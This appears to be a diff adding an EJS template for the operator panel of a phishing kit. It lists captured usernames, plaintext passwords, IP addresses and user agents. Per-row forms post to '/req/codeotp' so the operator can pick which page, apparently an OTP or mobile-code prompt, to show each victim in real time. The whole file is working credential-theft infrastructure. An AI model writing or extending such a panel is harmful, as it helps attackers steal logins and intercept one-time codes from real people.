@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Table</title>
+  <style>
+    /* CSS to define row colors based on the 'add' property */
+    .highlighted {
+      background-color: yellow;
+    }
+    
+    .clicked{
+
+      background-color: red;
+    }
+  
+  </style>
+  
+
+</head>
+<body>
+  <a href="/backend">Home</a><br><br>
+    <h1>User Table</h1>
+    <div>
+      <table id = "myTable" border="2">
+        
+            <tr>
+                <th>ID</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Ip</th>
+                <th>Useragent</th>
+                <th>Date</th>
+                <th>Page Code/OTP</th>
+                <th>Mobile Name/CODE</th>
+                <th>Notify</th>
+                <th>Action</th>
+                <th>Notify</th>
+            
+            </tr>
+        
+            <% rows.forEach(row => { %>
+              <tr <% if (row.notify == '0') { %> class="highlighted"<% } %>
+                <% if (row.notify == '2') { %> class="clicked" <% } %>
+                >
+                <form name="form" action='/req/codeotp' method='POST'>
+                <td><%= row.id %></td>
+                <td><%= row.username %><input type="hidden" name="username" readonly="" value="<%= row.username %>"></td>
+                <td><%= row.password %></td>
+                <td><%= row.ip %></td>
+                <td><%= row.useragent %></td>
+                <td><%= row.date %></td>
+                <td><input type="text" name="page"  value="<%= row.pagetype %>"></td>
+                <td><input type="text" name="mobile"  value="<%= row.mobiletype %>"></td>
+                <td><%= row.notify %></td>
+                <td><input type="submit" name="update" value="Update"></td>
+                <td><input type="submit" name="yes" value="Yes"></td>
+                </form>
+              </tr>
+            <% }); %>
+        
+        
+    </table>
+</div>
+
+  
+   
+</body>
+</html>
